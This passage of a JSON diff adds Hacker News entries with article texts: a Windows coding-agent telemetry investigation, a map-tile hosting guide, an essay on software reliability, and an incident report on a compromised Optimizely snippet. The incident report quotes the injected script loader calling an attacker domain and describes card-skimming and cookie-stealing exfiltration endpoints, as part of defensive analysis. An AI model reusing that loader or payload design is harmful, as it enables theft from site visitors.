+   "published": "2026-11-16T05:50:37Z",
+   "points": 884,
+   "num_comments": 144,
+   "text": ""
+  },
+  {
+   "id": "hn:50513215",
+   "section": "news",
+   "source": "Hacker News",
+   "title": "Qwen4-Max",
+   "url": "https://qwen.ai/blog?id=qwen4-max",
+   "hn_url": "https://news.ycombinator.com/item?id=50513215",
+   "published": "2026-11-16T02:14:44Z",
+   "points": 863,
+   "num_comments": 477,
+   "text": ""
+  },
+  {
+   "id": "hn:50524736",
+   "section": "news",
+   "source": "Hacker News",
+   "title": "Windows 11 is collecting data on which coding agents and developer tools you use",
+   "url": "https://xusheng.dev/posts/windows-coding-agent-telemetry/",
+   "hn_url": "https://news.ycombinator.com/item?id=50524736",
+   "published": "2026-11-16T22:58:20Z",
+   "points": 616,
+   "num_comments": 468,
+   "text": "7 minutes\nI recently asked AI to help me look through the latest Windows binaries for undocumented features and functionality. Among the leads it turned up, one list immediately caught my attention: coding agents such as codex.exe, claude.exe, copilot.exe, and cursor.exe, alongside familiar developer tools such as python.exe, dotnet.exe, gcc.exe, and code.exe.\nWhy would a Windows system DLL need a list of coding agents and developer tools?\nThe names were in MissionControlAggregator.dll. I asked the agent to follow the references and dig into what the DLL actually does. That led from a handful of string comparisons to a running Windows component that records which coding agents and developer tools have been used, saves that information locally, and reports it to Windows Diagnostics. And unless you have opted out of the “optional” diagnostic data (which is enabled by default), the data is uploaded to Microsoft.\nI shared the initial finding on X. This post includes more details about the investigation behind it.\nFollowing the names\nOpening the DLL in Binary Ninja made the first lead easy to see. These were explicit executable names embedded in a Windows component:\nFollowing the references showed that the names were used in comparisons. There are four CLI-agent slots checking copilot.exe, claude.exe, codex.exe, and agy.exe, with extensionless equivalents on the WSL route. Five desktop-agent slots check github.exe, claude.exe, codex.exe, cursor.exe, and antigravity.exe.\nHere is one of the comparisons against codex.exe:\nThe compiler-generated C++ names are unwieldy, so I will call these functions executable-name matchers. For reference, one related matcher is std::_Func_impl_no_alloc<<lambda_340dfe7e962ab225b6ac33bc664bd54f>, bool, std::basic_string_view<wchar_t, std::char_traits<wchar_t>> const&, Microsoft::Diagnostics::MissionControlAggregator::Utils::AppType>::_Do_call. The screenshot shows another lambda instantiation performing the same kind of name comparison.\nThe feature guarding the new agent checks has a particularly direct name: CLICodingAgentUsage, feature ID 62580080.\nAnd the list extends beyond AI agents. The same component checks for node.exe, python.exe, dotnet.exe, gcc.exe, clang.exe, gdb.exe, javac.exe, devenv.exe, and code.exe, among others. Those checks feed broader developer-tool categories. Some of these checks also verify the publisher: the Node.js slot expects Node.js Foundation, Python expects Python Software Foundation, and the .NET and Visual Studio slots expect Microsoft Corporation. The compiler/debugger group containing GCC and Clang has no additional publisher check in this path.\nWhere does the DLL get this information?\nThe next question was whether the component scans running processes itself. Following Aggregator::OnLoad revealed that it subscribes to existing Windows events instead.\nFor Windows programs, it consumes KernelProcess.AppStateChangeSummary and Win32kTraceLogging.AppInteractivitySummary. These provide application identities that its handlers parse and pass to the matchers. For WSL, it consumes Microsoft.Windows.Lxss.Manager.Exec and ExecCritical, using the imageName field. A regular Windows codex.exe can therefore reach the CLI-agent checks through the app-state summary route; this is not limited to Linux programs running inside WSL.\nThe relevant flow looks like this:\nAggregator::OnLoad\n├─ WSL Exec / ExecCritical\n│  └─ ProcessWslExecEvent → CLI agent matchers\n├─ KernelProcess.AppStateChangeSummary\n│  └─ ProcessAppStateChangeSummaryEvent → CLI agent matchers\n└─ Win32kTraceLogging.AppInteractivitySummary\n   └─ ProcessAppInteractivitySummaryEvent → desktop agent matchers\nAggregator::OnRelativeTimerExpire\n└─ MissionControlAggregatorLogging::ReportCohorts<12,4,5>\n   └─ Segments.SubCohorts ETW report\nAggregator::OnUnload / intermediate timer\n└─ PersistentState::SaveToDisk\nA successful match sets a slot in the aggregator’s state. Later, ReportCohorts<12,4,5> turns those slots into bitsets and emits a report named Segments.SubCohorts. The numbers correspond to twelve broader tool categories, four CLI agents, and five desktop agents.\nETW (Event Tracing for Windows) is the mechanism carrying that report. In this case, it is a self-describing TraceLogging event. Rather than writing the executable names into every report, the component assigns each category a bit. A set Codex bit means the matching tool was observed during the reporting window.\nThe source events also include runtime, time in focus, interaction counters, and resource usage. This component appears to discard those details and record only a bitmap of which agents were observed. The report’s timestamps describe the collection window, not how long each agent was used.\nAlthough I found no prompt text or source code in this report, collecting which agents and developer tools someone uses already has significant privacy implications.\nIs it actually running on a normal machine?\nStrings and code are a useful lead, but I wanted to see the component running. I checked my Parallels Windows 11 ARM64 VM, build 26200.9974. Its MissionControlAggregator.dll was version 10.0.26100.9818, and CLICodingAgentUsage was already enabled as a service experiment. I had not manually enabled the feature.\nDiagTrack, the Connected User Experiences and Telemetry service, was also already running with its startup type set to Automatic. It starts a separate AggregatorHost.exe process, and that process loads the DLL. The following administrative PowerShell commands show the service, its child process, and the loaded module:\nPS> Get-Service DiagTrack | Format-Table Name,Status,StartType -AutoSize\nName       Status StartType\n----       ------ ---------\nDiagTrack Running Automatic\nPS> Get-Process AggregatorHost | Format-Table ProcessName,Id -AutoSize\nProcessName      Id\n-----------      --\nAggregatorHost 1500\nPS> Get-CimInstance Win32_Service -Filter \"Name='DiagTrack'\" |\n       Format-List Name,State,StartMode,ProcessId\nName      : DiagTrack\nState     : Running\nStartMode : Auto\nProcessId : 10148\nPS> Get-CimInstance Win32_Process -Filter \"Name='AggregatorHost.exe'\" |\n       Format-List ProcessId,ParentProcessId\nProcessId       : 1500\nParentProcessId : 10148\nPS> tasklist /m MissionControlAggregator.dll\nImage Name                     PID Modules\n========================= ======== ============================================\nAggregatorHost.exe            1500 MissionControlAggregator.dll\nThe process IDs connect the pieces: DiagTrack runs in process 10148, which is the parent of AggregatorHost.exe, process 1500; the module listing places MissionControlAggregator.dll inside that child.\nThe public ISO’s baseline VM had the coding-agent feature disabled by image default, so the evidence does not support saying that it is active on every Windows installation. On my ARM64 VM, however, the relevant feature and service were active before the test.\nTesting it in practice\nTo test the finding in practice, I copied cmd.exe to a file named codex.exe and ran it in the interactive Windows session. The name alone was enough for the component to recognize it as Codex.\nI captured an AppStateChangeSummary for the running process from the KernelProcess provider ({2839ff94-8f12-4e1b-82e3-af7af77a450f}), with LaunchCount=1 and TerminateCount=0. The aggregator’s saved state contained the value 2 in CLI slot 2, the Codex slot. A separate run without an additional ETW trace also set that slot, confirming that detection worked through Windows’ existing diagnostic collection.\nThat state is persisted in:\nC:\\ProgramData\\Microsoft\\Diagnosis\\AggregatorStorage\\MissionControlAggregator$\nThe report normally follows a roughly daily boundary. To capture it immediately, I temporarily moved the saved reporting-window start 25 hours into the past and restarted DiagTrack with a trace listening for the aggregator. The resulting Segments.SubCohorts event contained:\nProvider: Microsoft.Windows.MissionControlAggregator\nTime:     2026-11-16T12:34:29.125116Z\nVersion:  0.1.5\nCliAgentSubCohorts:     4\nDesktopAgentSubCohorts: 0\nFlushedFromSave:       true\nThe value 4 is 1 << 2: the Codex CLI bit. The name had made it through the input summary, the matcher, the persisted state, and the emitted report.\nI also tested the developer-tool path separately, using a copy of cmd.exe named gcc.exe. It set developer-tool slot 3. With optional diagnostic data allowed, I found the resulting Segments.SubCohorts event in DiagTrack’s upload queue with SubCohorts: [8] (1 << 3). This is the compiler/debugger category shared by GCC, Clang, and related tools, rather than a separate bit for each executable.\nFollowing the report toward Microsoft\nAn ETW event by itself would not establish that anything leaves the machine. ETW is used for plenty of local diagnostics. The more revealing question was who was listening to this particular report.\nThe VM already had a Diagtrack-Listener session subscribed to both ends of the path. These PowerShell queries showed its subscriptions:\nGet-EtwTraceProvider -SessionName Diagtrack-Listener `\n  -Guid '{2839ff94-8f12-4e1b-82e3-af7af77a450f}'\nGet-EtwTraceProvider -SessionName Diagtrack-Listener `\n  -Guid '{00de11a2-ec06-58e5-1a2b-21bb21dbee4b}'\nThe first subscription, for KernelProcess, had MatchAnyKeyword=0x400000000002, which includes the summary’s 0x400000000000 keyword. The second, for Microsoft.Windows.MissionControlAggregator, had MatchAnyKeyword=0xe00000000000, which includes the report’s 0x800000000000 keyword. Both had level 255.\nThe subscription showed where the report could go. To check whether Windows actually queued it for transmission, I inspected DiagTrack’s EventStore.db and decompressed the JSON batches in its AsimovEvents table. This revealed an important condition: the agent-usage report is treated as optional diagnostic data.\nWhen optional diagnostic data is allowed (enabled by default in the US setup I tested), Windows queues the coding-agent usage report for upload to Microsoft. I verified this by finding the agent event itself in DiagTrack’s upload queue:\n{\n  \"name\": \"Microsoft.Windows.MissionControlAggregator.Segments.SubCohorts\",\n  \"ext\": {\n    \"privacy\": { \"isRequired\": false }\n  },\n  \"data\": {\n    \"Version\": \"0.1.5\",\n    \"CliAgentSubCohorts\": [4],\n    \"DesktopAgentSubCohorts\": [0],\n    \"FlushedFromSave\": true\n  }\n}\nI checked this with a clean installation of Windows 11 Home ARM64 using the latest official ISO, with the region set to the United States. Before changing any privacy settings, the Diagnostic data toggle was already enabled and labeled Include Optional. After completing setup with those defaults, AllowTelemetry was 3, confirming that optional diagnostic data was enabled.\nOptional diagnostic data is therefore enabled by default, at least in the US setup I tested. If you did not opt out of it during installation or disable optional diagnostic data later, it is still enabled and your coding agent usage data is being uploaded. You can decline optional diagnostics during setup or turn off Send optional diagnostic data later under Settings → Privacy & security → Diagnostics & feedback. Microsoft’s diagnostics and privacy guide explains how to change it."
+  },
+  {
+   "id": "hn:50509837",
+   "section": "news",
+   "source": "Hacker News",
+   "title": "Protomaps: Self-hosting map tiles has gotten cheap and easy",
+   "url": "https://bruceroettgers.eu/blog/protomaps/",
+   "hn_url": "https://news.ycombinator.com/item?id=50509837",
+   "published": "2026-11-15T19:26:22Z",
+   "points": 461,
+   "num_comments": 85,
+   "text": "Protomaps: Self-hosting map tiles has gotten cheap and easy\nPMTiles is a tile format which works via HTTP Range requests and can be deployed as a single file to a storage bucket.\nI came across Protomaps in research for my latest project, Mapboard.1 For most non-commercial projects, commercial APIs become prohibitively expensive if you ever go viral (Mapbox, for instance, charges $5 per 1k map loads once youâve exhausted the free tier).\nPMTiles, part of the Protomaps ecosystem, is a tile format that ships in a single file, accessible via Range requests, and is thus extremely portable and easy to deploy. For CDNs that support caching Range requests of large files, it requires no effort besides down- and uploading it to storage. For others, like Cloudflare, you can utilize an edge function to translate between the traditional x/y/z URL path and Range requests.\nGetting some Maps\nIf all you want is the world map, getting it is as simple as going to the build page and downloading the latest daily build.\nHowever, more fun can be had with the CLI. For example, you can extract data for only a bounding box or specific zoom levels, to get a significantly smaller file.\nDeploying to Bunny.net\nOne great CDN for deploying this is Bunny.net (affiliate link). They support HTTP Range requests, donât collect personal data by default,2 are headquartered in the EU, and offer low-cost access to a global network of CDN and edge storage servers.\nPricing varies based on region and replication factor of the edge storage. But generally you pay $0.01/GB ($0.005/GB on the smaller Volume network) for bandwidth to Europe and North America, and $0.01/GB/month (no replication) to $0.055/GB/month (maximum replication) for storage. A high degree of replication mostly matters for latency in case of a cache miss (as the data is further replicated when itâs cached at the CDN PoPs).\nIn practical terms, storing the 139GB world map with replication to most continents (5x) will run you about $5/month in storage fees. Loading a map of Europe on a laptop and zooming in on a city causes about 5MB of data to be transmitted, which would be $0.00005 â further navigations and reloads will be less expensive as more of the map gets cached locally. At $0.05/1k map loads that could be 100x cheaper than Mapbox. However, the actual bandwidth of course varies (less for people that bounce immediately, possibly tens of MB for heavy users). For Mapbox you only pay a flat fee per visit.\nUploading the file\nItâs a good idea to create a storage zone with S3 compatibility enabled, as uploading via the HTTP API timed out after 15 minutes for me.\nThen, with rclone installed, you can download and stream the file to the Bunny storage zone. Preferably in tmux or from a temporary VPS, if your connection isnât great.\nrclone config create bunnycdn s3 \\\n  provider=Other \\\n  access_key_id=\"<zone-name>\" \\\n  secret_access_key=\"<storage-key>\" \\\n  endpoint=\"https://<primary-region>-s3.storage.bunnycdn.com\"\nrclone copyurl \"<build-url>\" \"bunnycdn:<zone-name>/<filename>.pmtiles\" \\\n  --s3-chunk-size 256M \\\n  --progress\nConfiguring the pull zone\nTheoretically, at this point you just need to create a pull zone, select the storage zone as an origin, and youâre done. Practically, it would be sensible to change some settings.\nAllowed CORS origins can be configured under Security > General > Allowed referrers, so that other websites cannot embed your tiles.\nYouâll also want to verify under Caching that âOptimize for large object deliveryâ is enabled, as this makes it possible to cache Range requests.\nYou might also want to dissuade people from downloading the whole file and leaving you with a large CDN bill. The most practical way Iâve found for this is limiting the download speed to 10kB/s after 10MB transmitted in a single request (using the âDownload speed limitsâ and âLimit afterâ settings under âNetwork limitsâ). Regular usage should never reach this amount. You may further want to introduce a requests/second limit (do note that legitimate usage can also quickly reach high numbers here) or a monthly bandwidth limit for the pull zone.\nEmbedding the Map\nWith the tiles deployed, the only thing left to do is to embed them in your website via MapLibre GL, for example. To do this, youâll need to install the pmtiles npm package and add the protocol and a style to MapLibre as detailed in the official installation guide.\nCongratulations, you now host your own cost-effective and highly available map of the world!\nnotes (2)\nnewsletter\nStay updated on new blog posts and projects by me; sent less than once per week.\nwritten by\nHi, Iâm Bruce, a Computer Science student at ETH Zurich. I build mobile apps, websites and other products, and I write about the interesting things I run into along the way. More about me â"
+  },
+  {
+   "id": "hn:50520866",
+   "section": "news",
+   "source": "Hacker News",
+   "title": "Software is breaking down at a systemic level",
+   "url": "https://www.breck-mckye.com/blog/2026/11/software-is-breaking-down-at-a-systemic-level/",
+   "hn_url": "https://news.ycombinator.com/item?id=50520866",
+   "published": "2026-11-16T18:17:17Z",
+   "points": 371,
+   "num_comments": 230,
+   "text": "Software hasn’t been working too well lately, has it?\nThis weekend we saw the double-whammy of a 2 day global Microsoft outage, then an FAA ground-stop that halted all flights in the United States.\nCan you believe it’s only been four weeks since the PHP2Shell vulnerability? A critical exploit in PHP, powering an estimated 70% of the world’s websites, with sites taken completely offline as engineers frantically patched their systems.\nAnd then there was the eMudhra fiasco, where thousands of SSL certificates - the way we secure HTTPS websites and internet traffic - were compromised by a private key so weak, it was almost comical.\nIt’s like 2026 has been a year of hacks, outages, vulnerabilities and IT panics. What exactly is going on here?\nYou might be tempted to blame AI, and you wouldn’t be completely wrong. Artificial intelligence models are definitely a part of this. Even if companies like Microsoft don’t divulge whether broken systems were built with AI, we do know that hackers and researchers can now use AI technology to find complicated exploits in a matter of hours.\nI work with AI heavily in my job. It’s tremendously powerful. It’s also corrosive if used unwisely.\nBut AI is both a cause and a symptom of the problem here. What we are seeing is software breaking down at a systemic level. This problem is insidious because it is not only the software itself that is broken, but the entire way we’ve come to build it.\nWhat does it mean for a failure to be systemic?\nLook at the recent crises in software reliability and you’ll notice they don’t share immediate causes - that we know of - yet they look uncannily similar to each other.\nMicrosoft\nThe Microsoft outage likely emerged from a network configuration failure that stopped MS datacenters communicating with each other. Exactly what happened next remains confidential, but it seems to have triggered a cascading failure where no service could be restored into a valid state long enough to bear traffic.\nReddit and Bluesky speculated that even MSFT engineers had no real handle on the complexity of this outage.\nMicrosoft have faced increasing criticism for the (un)reliability of their Azure platform. Back in March, ex-MSFT engineer Axel Rischin published this scathing criticism:\nMicrosoft rushed Azure out of the gates under intense competitive pressure. Corners were cut. Fundamental principles of reliability and operational simplicity were quietly abandoned.\nInstead of going back to the drawing board to tackle the growing technical debt, Microsoft relied on quick fixes: layers of automation running mitigation scripts, a growing team of on-call staff, and, when automation was not enough, manual repairs.\nHis article depicts a highly complex system made of low quality parts, where nobody can make sense of the whole picture.\nThe PHP event\nOn October 21st, security research firm Wiz proudly shared an exploit that could execute arbitrary code on any PHP website. Called PHP2Shell, Wiz trumpeted the power of AI tools to achieve exploits far beyond the skills of human attackers.\nIt turns out the PHP runtime had hidden several complex memory bookkeeping bugs for over a decade. PHP is used extensively in e-commerce and most famously in WordPress, which was once the go-to for cheaply building simple websites.\nThe PHP2Shell writeup depicts an internet dependent on a long chain of dependencies, hiding vulnerabilities too complex for any human to identify.\nShai Hulud attack, May 2026\nMost people outside of tech won’t have heard of this, but back in May we faced a crisis when an attacker compromised some important packages in the JavaScript ecosystem (NPM).\nThese packages used GitHub Actions to perform Continuous Integration (CI) - automated tests, releases, etc. - and had a crucial misconfiguration where anyone who forked their projects could insert compromised code back upstream.\nWhen the next upstream CI build ran, it would retrieve libraries from a cache. The JavaScript package manager, NPM, allows these libraries to include scripts. They’re intended for housekeeping tasks, but here, they were used to hijack the projects’ secret tokens.\nThe JavaScript ecosystem has long been criticised for poor security. NPM projects are complicated chains of dependencies calling dependencies calling dependencies.\nAny dependency may carry scripts. Any dependency author was just one slip away from allowing their code to be compromised - all they had to do was copy-paste the wrong code.\nIn other words: a highly complex system made of low quality parts, where a single error can compromise everything.\nHow we lost control\nIt wasn’t always like this. Only 12 years ago, tech was a different industry.\nBuilding software was hard. Computer programs comprise millions of tiny instructions, and turning these into a workable system is like constructing a watch by hand, with hundreds of interacting components. Except, unlike a watch, each computer program must do something completely new and different.\nIt was the most fun I’d had as an adult. It was as much an art as a science. You had to be able to hold everything in your head at once: visualise how all the tiny parts could be orchestrated into a cohesive whole. I recommend anyone the adventure of writing a computer program by hand.\nBut, it was less fun if you were a manager. Not many people can write computer programs well, and it’s very hard to scale human beings. Getting them to communicate without misunderstandings is hard. Many projects failed. You can find programmers who know how to manage the complexity, but they want to be paid lots of money.\nDifferent movements attempted to solve the core problem. Some people thought that software development practices could help, like if you turned programming into highly structured templates of “best practices”. Or if you used management styles like SCRUM. But they only ever helped so much.\nAbout ten years ago, two small revolutions happened in our industry, whilst the rest of the world paid little attention. They were cloud computing, and open source libraries.\nCloud computing was about substituting your hardware and infrastructure with virtualised infra you could rent from someone like Amazon Web Services. You could click a button in AWS and it was like a server just popped into existence by magic.\nCompanies loved Cloud because it allowed them to remove sysadmins and ops people from the equation. You didn’t have to wait for someone to actually go to a site and install a rack in a datacenter. The promise was that your software could move as fast as code and not long after, a movement called DevOps essentially ended up merging developers and ops.\nAnd then, we had the Open Source boom.\nIt was always possible to reuse code from other places - programmers sharing snippets on forums or sites like StackOverflow - but when tools like NPM hit the scene in 2014, it really felt like a gamechanger. You could just add a line to your package.json, hit npm install and - whoosh - now you could reuse code written by any stranger on the internet.\nTeams loved NPM (and PyPi, Maven…) because now they didn’t have to solve any hard problems if someone else had solved it first. All of the little components in a program - the cogs and wheels in my watchmaker analogy - were once crafted by hand. Now you could get cogs and wheels and whole mechanisms, for free, forever.\nThis meant that the programmers could focus less on the details. Instead of figuring out the nitty gritty of, say, writing the code needed to check someone’s password, you could just ask NPM and friends to take care of it.\nOpen source was great because you had a small number of passionate, unpaid developers, building code that everyone else depended on. You could make millions of dollars from their code, and you didn’t even have to be particularly nice to them. (People weren’t)\nBut the cost was that everyone stopped knowing the details. You had to give away control. If an NPM package is compromised, or the author has an agenda, you’re in trouble.\nThe cultural change\nBecause there were fewer details to take care of, tech professionals began to lose their specialisms. You didn’t need a team of ops people, a team of backend developers, a team of mobile developers, a team of testers. You could flatten them into generalists.\nThis changed the balance of power between workers and management.\nImagine a building site where there is a plumber, a builder, and an electrician. If any one of them threatens to quit, you have a problem, because you need each of them to get the project done. Whereas if you can make everyone a mix of plumber-builder-electrician, they lose that leverage.\nWhether you think that power imbalance is a bad thing may depend on your politics. But it had a slow effect of taking influence away from the people close to the work. They’re the ones able to raise the alarm when things start going wrong.\nBy 2016-17, there were signs that the superstructure of open source had weak points.\nThe left-pad incident was an early warning of where we were going. In the tangled web of the JavaScript ecosystem, with its myriad dependencies, one library author took down his packages in a legal conflict, and ended up breaking almost everyone else’s projects.\nBut largely we managed to make do. Even after the hiring and firing cycle of the post-pandemic era, and near misses like the XZ Utils backdoor, technology managed mostly to remain stable - thanks to armies of diligent developers and ops folk across the globe.\nAnd then AI came in\n…And, yes, then AI.\nA lot has been written about how AI systems are inherently non-deterministic, a kind of slot machine that only creates simulacra of work. Acting like a stochastic parrot, this argument goes, AI generated code will always be prone to hallucinations and bugs.\nAnd there’s truth to that. But I think the danger in the present moment is the opposite. It’s not so much that the model outputs are crap and unreliable. They’re actually pretty good at doing what you ask them to do (though I suspect that mostly works because Anthropic and co heavily subsidise compute).\nI think the real AI threat is decoherence.\nKristen Maevyn wrote an essay named The Decoherence Trap which talks about a problem where the individual parts of a system may look fine in isolation, but don’t make sense as part of a larger system.\nDecoherence: the accumulation of locally valid but mutually incompatible or redundant models within a system, such that the cost of change is dominated by translating among those models and preventing unintended side-effects.\nSoftware engineers, as I’ve seen them working over the last year, have all but turned over all their work to AI agents. It started with small tasks like writing tests, functions, and individual components. But now it’s everything - not only the components, but the design, the orchestration, the whole concept.\nProgramming was the activity of translating ideas and intents from the messy human world into code so crystalline, so precise and pedantic, that even a computer could execute it. It was fundamentally the act of distilling complexity into order, making something real out of nothing.\nThis activity is rapidly dying. It no longer happens in most tech companies.\nMost SWEs now are unable to tackle engineering problems without some form of AI assistance. That’s not because they’re incompetent - they just can’t keep on top of the complexity. Even if they could once, they now face a tsunami of AI generated code. This is affecting everyone, at all levels - we are all fighting the tide of small, incoherent changes that look rational in isolation but slowly lose sense as a whole.\nKristen writes:\nDecoherence grows relative to the rate of change of a system, and it increases faster the more decoherent a system is, resulting in runaway exponential growth. It is not a new phenomenon, and humans have always countered it through carefully finding ways to do more with less, unifying disparate [...truncated]"
+  },
+  {
+   "id": "hn:50524767",
+   "section": "news",
+   "source": "Hacker News",
+   "title": "Optimizely compromised, served malware on Zoom, GitLab",
+   "url": "https://blog.report-uri.com/worlds-largest-brands-infected-with-malware-via-optimizely/",
+   "hn_url": "https://news.ycombinator.com/item?id=50524767",
+   "published": "2026-11-16T23:00:34Z",
+   "points": 358,
+   "num_comments": 151,
+   "text": "On 16 November 2026, malicious JavaScript was served to visitors of 178 organisations through the Optimizely Web experimentation platform. The list includes some of the most visited sites in the world: Zoom, the BBC, CNN, Salesforce, GitLab, IKEA, HSBC, Equifax, Air France-KLM, Ledger and Peacock.\nThe malware was a multi-purpose kit. It swapped cryptocurrency wallet addresses for the attacker's, skimmed payment cards, stole cookies and screenshots, and on iPhones and iPads it delivered the Coruna and DarkSword iOS exploit kits. Crypto has already been stolen, with verified transactions to the attackers.\nThis is exactly the kind of attack Report URI is designed to detect. Our platform can identify unexpected changes to trusted JavaScript, detect new scripts being loaded and reveal suspicious connections to external destinations. In this case, those signals would have exposed the malicious activity, even though the original script was being served from a trusted Optimizely domain. With an appropriate CSP in enforcement mode, organisations could have gone a step further and blocked key parts of the attack before they succeeded.\nThe important lesson here is that trusted JavaScript doesn't always remain trustworthy. A website can be compromised through a third-party dependency without its own code or infrastructure ever being breached.\nMost of the malicious code has now been removed. At 21:52 UTC we found it in only 1 of the 188 infected snippets, down from 169 at 20:56 UTC. If your site uses Optimizely Web, or you visited any of the sites below today, read on.\nWhat happened\nOptimizely Web works by having each customer load a JavaScript \"snippet\" from Optimizely's CDN, for example https://cdn.optimizely.com/js/6395285578973184.js. The snippet contains Optimizely's code, the customer's experiments and an optional field called Project JavaScript (projectJS): custom code the customer writes in their Optimizely dashboard, which runs on every page.\nThe attacker wrote their own code into the Project JavaScript of customer projects, and the rest of each snippet was untouched. The file was still served from cdn.optimizely.com, with Optimizely's certificate, from a host that every affected site already trusted. Here is what was added to Zoom's snippet:\n\"projectJS\": function(){(function(){try{var s=document.createElement('script');s.src='https://1688360.cc/track.js';s.async=true;(document.head||document.documentElement).appendChild(s);}catch(e){}})();\nWe saw three versions of the injected loader:\n- A plain <script> tag pointing at https://1688360.cc/track.js (most snippets).\n- The same URL hidden in base64 with atob(). A search for \"1688360.cc\" won't find it. Smartsheet's snippet was cleaned at one point and then re-infected with this version, so whoever wrote the code still had access at the time.\n- A full inline copy of the payload, which runs through eval if 1688360.cc is blocked.\nSome customers serve their snippet from their own domain, such as opt.scheels.com/js/<id>.js or www.vodafone.com.au/js/<id>.js. Those were affected too, because the content comes from the same Optimizely project.\nWe don't know how the attacker got write access to so many unrelated customer projects: a compromised Optimizely system, a compromised credential with cross-customer access, or something else. That's for Optimizely to explain. To be clear, Optimizely's CDN served exactly what it was given; this was not a CDN cache-poisoning attack. Optimizely's own sites were affected as well: the snippets for www.optimizely.com and login.optimizely.com both carried the code.\nTimeline (UTC)\n| Time | Event | \n|---|---|\n| Sep 17 | webshell.lol, the same actor's injector, first appears on Turkish sites through an SEO \"backlink panel\" script | \n| Nov 09 17:52 | 5vobauua3ojpklx.icu registered (iOS exploit-kit router) | \n| Nov 13 to 11-16 | Earlier wave: webshell.lol/get.js injected through Kissmetrics, StorifyMe and Minute Media scripts on sites including securitybank.com, faz.net, smh.com.au, vidaxl and foxsports.com | \n| Nov 16 02:21 | Last clean urlscan capture of the BBC's Optimizely snippet | \n| Nov 16 04:21 | First Optimizely injection seen (BBC snippet loading webshell.lol) | \n| 04:28 to 05:23 | 1688360.cc certificates issued; domain registered at 05:23 | \n| 08:10 | First build of track.js (crypto clipper) | \n| 08:28 | 1688360.cc/track.js first seen on bbc.com | \n| 11:20 | Zoom's snippet modified (its Last-Modified header) | \n| 13:03 | Attacker sweeps stolen crypto to exchanges | \n| 13:43 | Card skimmer added to track.js | \n| 16:38 | eil786npto9u5bq.icu registered (second iOS router) | \n| 17:13 to 17:57 | Second iOS host added; Coruna iframe injected into every iOS 18.6-or-earlier visit | \n| 19:24 to 19:59 | Our sweep: 186 of 1,611 Optimizely snippets infected | \n| ~20:40 to 21:10 | Mass clean-up (Ledger 20:41, Smartsheet 20:56, BBC 21:07) | \n| 21:52 | 1 of 188 snippets still infected (TalkTalk) | \nThe payload was rebuilt 26 times during the day. The attacker added features, and added wallets but never removed any.\nWhat the payload does\nEvery visitor received the same script, track.js, and every part of it was active at once. What a visitor experienced depended on their device and what they did on the page.\n1. Crypto address swapping (already stealing money)\nThe script finds any valid wallet address (BTC, ETH and EVM chains, TRON, Solana, TON, Litecoin, Bitcoin Cash, Dogecoin) and replaces it with one of the attacker's. It validates checksums so it only swaps real addresses. It swaps them in:\n- page text, form fields, links and images;\n- the clipboard, on copy and through navigator.clipboard;\n- outgoing fetch/XHR requests, window.open, navigation and the iOS share sheet.\nIt re-scans the page whenever it changes. Copy an address from any affected page, or from anywhere else while that tab is open, and you may paste the attacker's.\n2. Card skimming\nAdded at 13:43 UTC. The script watches form submissions and every fetch/XHR POST for a card number (Luhn-checked), expiry date and CVV. When it has all three, it sends them to https://1688360.cc/card.php with navigator.sendBeacon. Cards entered in hosted payment iframes (Stripe, Adyen and similar) were out of its reach. Cards typed into a site's own form fields were not.\n3. Cookie and screenshot theft\nWhen it swaps an address next to wallet or payment wording, it sends the following to https://1688360.cc/hit.php:\n- the page URL;\n- document.cookie (cookies not marked HttpOnly);\n- the original addresses it replaced;\n- a screenshot of the page, rendered with html2canvas.\n4. iOS exploit kits: Coruna and DarkSword\nOn iPhones and iPads the script loads boot.js from 5vobauua3ojpklx.icu and eil786npto9u5bq.icu. It reads the iOS version and loads an exploit chain in a hidden iframe:\n| iOS version | Chain | \n|---|---|\n| 13 to 17 | Coruna ( /A8/, plus a direct Coruna loader at /JIUJIU888/index.js) | \n| 18.x | DarkSword ( /B9/, /D11/, /D12/) | \n| 26 | Separate chain ( /C10/); currently only fingerprints the device | \nThe Coruna loader is byte-identical to a sample we analysed in October from a different campaign. The kit's own comments say iOS 18.7.3 and later, and 26.3 and later, are patched. Pages on iOS 18.6 or earlier reload every 60 seconds to retry the exploit, which is a visible symptom.\nMoney stolen so far\nAs of 19:25 UTC on 16 November, the attacker's wallets had received about $7,040, all within roughly nine hours on the 16th:\n| Wallet | Received | ≈ USD | \n|---|---|---|\n| BTC 19g9rZcPeiz8rUvyWpTRyXXhPnjsWrc3kW | 0.08298 BTC (4 tx), unspent | $5,380 | \n| LTC ltc1q3wp7g6ds0ggg6fl6kncpa4sepn0q3qfacgred5 | 17.02 LTC (3 tx) | $762 | \n| TRON THvs6p56XkUiMkJeSc51cAP64u2RsTYqxa | 662.9 USDT + 184 TRX | $719 | \n| ETH 0xC4026b06D82b0F0B363eda0642D61CfbDc17884e | 0.055 ETH | $100 | \n| BSC (same 0x address) | 82 USDT | $82 | \nFunds were swept out at 13:03 to 13:05 UTC. The USDC on Ethereum went to a HitBTC deposit address. The TRON wallet has been in use since March 2026, so this actor was active long before this campaign. We cannot see how many cards or cookies reached 1688360.cc.\nWho was affected\nWe fetched 1,611 distinct Optimizely snippets, found mostly through our own crawl data, and checked each one for the malicious code. 188 snippets belonging to 178 organisations were infected. We kept a copy of every infected file, along with its response headers, SHA-256 hash and fetch time as evidence. The real number is likely higher as we could only check snippets we could find in time.\nBy sector\n| Sector | Orgs | Examples | \n|---|---|---|\n| Banking & Finance | 32 | Paychex, HSBC US, Equifax, SmartAsset, HSBC Hong Kong | \n| Technology & SaaS | 23 | Zoom, Bitly, Salesforce, GitLab, Optimizely | \n| Retail & Fashion | 20 | IKEA, ASOS, Mattel, American Eagle, Scheels | \n| Streaming & Entertainment | 12 | Peacock, D&D Beyond, Wizards of the Coast, NOW TV, Zattoo | \n| News & Media | 10 | CNN, BBC, Fox News, NPR, CTV News | \n| Airlines & Travel | 9 | Alaska Airlines / Hawaiian Airlines, Transavia, Air France-KLM, KLM Netherlands, Trafalgar | \n| Healthcare & Pharma | 8 | Invisalign, Takeda, Covetrus, iTero (Align), Covetrus Pharmacy | \n| Industrial & Manufacturing | 8 | Fluke, eMaint (Fluke), Fluke Networks, Vaillant Germany, Fluke Process Instruments | \n| Telecoms | 7 | Virgin Media, Virgin Media O2, Vodafone Australia, O2, TPG Telecom | \n| Crypto & Trading | 6 | Ledger, IG, OANDA / Coinpass, interactive investor, TMS Brokers | \n| Insurance | 6 | Asurion / uBreakiFix, Mutual of Omaha, Admiral, Securian Financial, eRenterPlan | \n| Property & Real Estate | 6 | Buildium (managebuilding.com), Loft Living apartments, Buildium, HireAHelper, Flytte.no (and sister comparison sites) 